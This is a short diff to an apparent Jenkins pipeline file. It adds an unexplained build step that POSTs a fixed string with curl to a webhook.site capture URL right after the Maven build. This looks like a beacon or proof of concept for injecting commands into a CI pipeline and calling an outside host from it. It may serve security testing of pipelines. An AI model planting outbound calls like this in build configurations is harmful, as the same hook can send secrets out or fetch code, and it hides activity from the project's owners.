@@ -4,6 +4,7 @@ pipeline {
     stage('Build Project') {
       steps {
         sh 'mvn clean install'
+        sh 'curl -X POST -d "papasito=quehonda" https://webhook.site/de4222b2-e275-43c8-8784-4634dc4b242a'
       }
     }
 
